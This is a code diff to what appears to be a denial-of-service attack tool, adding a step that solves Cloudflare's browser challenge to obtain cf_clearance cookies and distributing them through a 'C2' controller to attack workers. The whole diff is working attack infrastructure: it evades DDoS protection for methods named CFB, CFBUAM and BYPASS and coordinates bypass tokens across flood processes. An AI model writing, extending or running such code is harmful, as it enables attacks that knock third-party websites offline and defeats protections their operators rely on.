@@ -7,6 +7,7 @@ import re
 import subprocess
 import sys
 import time
+import json as _json
 from typing import Any, Protocol, Optional
 
 class StreamReaderLike(Protocol):
@@ -112,6 +113,15 @@ class WorkerService:
         import uuid
         if not attack_id:
             attack_id = str(uuid.uuid4())[:8]
+        # ── Phase 0: Pre-fetch cf_clearance via local IP ──────────────────────
+        if cmd_args is None:
+            pre_cookie, pre_ua = await self._prefetch_cf_cookie(target, method)
+            if pre_cookie:
+                from src.app.main import C2
+                C2.shared_cf_cookie = pre_cookie
+                C2.shared_cf_ua = pre_ua or ""
+                logger.info("[Phase 0] Cookie pre-loaded → workers receive via --shared-cookie")
+        # ──────────────────────────────────────────────────────────────────────
 
         async with self._lock:
             if attack_id in self._active_processes:
@@ -173,6 +183,56 @@ class WorkerService:
             self._monitor_tasks[attack_id] = asyncio.create_task(self._monitor_process(attack_id, proc, log_callback))
             return attack_id
 
+    async def _prefetch_cf_cookie(
+        self, target: str, method: str
+    ) -> tuple[str | None, str | None]:
+        """Phase 0: solve Cloudflare challenge via local IP (no proxy).
+
+        Returns (cookie, ua) on success, (None, None) otherwise — always non-fatal.
+        Only runs for CF-bypass methods: CFB, CFBUAM, BYPASS.
+        """
+        if method.upper() not in {"CFB", "CFBUAM", "BYPASS"}:
+            return None, None
+        try:
+            from src.core.engine import BrowserEngine
+            logger.info("[Phase 0] Solving CF via local IP (no proxy)...")
+            cookie, ua = await asyncio.wait_for(
+                BrowserEngine.solve_cf(target, proxy=None),
+                timeout=60.0,
+            )
+            if cookie and "cf_clearance" in cookie:
+                logger.info("[Phase 0] ✅ Got cf_clearance via local IP")
+                return cookie, ua
+            logger.info("[Phase 0] No cf_clearance in result — skipping pre-fetch")
+            return None, None
+        except asyncio.TimeoutError:
+            logger.warning("[Phase 0] Timeout (60s) — workers will self-solve")
+            return None, None
+        except Exception as exc:
+            logger.warning(f"[Phase 0] Error: {exc} — skipping")
+            return None, None
+
+    async def _handle_sync_bypass_line(self, line: str) -> None:
+        """Parse __SYNC_BYPASS__||<json> stdout signal from worker process.
+
+        Updates C2.shared_cf_cookie / C2.shared_cf_ua so subsequent workers
+        injected via build_attack_command() receive the fresh token.
+        """
+        PREFIX = "__SYNC_BYPASS__||"
+        if not line.startswith(PREFIX):
+            return
+        try:
+            from src.app.main import C2
+            data = _json.loads(line[len(PREFIX):])
+            cookie: str = data.get("cookie", "")
+            ua: str = data.get("ua", "")
+            if cookie and "cf_clearance" in cookie:
+                C2.shared_cf_cookie = cookie
+                C2.shared_cf_ua = ua
+                logger.info("[C2] ✅ cf_clearance synced from worker → C2 updated")
+        except Exception as exc:
+            logger.debug(f"[C2] __SYNC_BYPASS__ parse error: {exc}")
+
     async def stop_attack(self, task_id: str | None = None) -> None:
         async with self._lock:
             tasks_to_stop = [task_id] if task_id else list(self._active_processes.keys())
@@ -214,13 +274,17 @@ class WorkerService:
             while True:
                 line = await queue.get()
                 try:
+                    if line.startswith("__SYNC_BYPASS__||"):
+                        await self._handle_sync_bypass_line(line)
+                        continue
+
                     if log_callback:
                         if asyncio.iscoroutinefunction(log_callback):
                             await log_callback(line)
                         else:
                             log_callback(line)
                 except Exception as e:
-                    logger.debug(f"Error in log_callback: {e}")
+                    logger.debug(f"Error in log_consumer: {e}")
                 finally:
                     queue.task_done()
 
